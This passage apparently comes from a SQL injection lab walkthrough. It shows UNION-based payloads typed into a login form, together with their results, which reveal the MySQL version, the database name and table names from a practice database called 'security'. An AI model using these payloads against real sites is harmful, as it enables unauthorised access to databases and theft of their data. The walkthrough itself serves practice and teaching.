Extracting the data



We will be using UNION statements to dump the database info.

NOTE: Columns on both sides of UNION should be the same.

As we can see in the previous section we have 2 columns, so the UNION statement must have 2 columns too.

a) Getting database and version.

Insert: ") union select version(),database() #



Result: Your Login name:8.0.22-0ubuntu0.20.04.3. Your Password:security.

b) Getting table names on “security” table.

Insert: ") union select 1, table_name from information_schema.tables where table_schema="security" #.



Result: Your Login name:1. Your Password:emails.
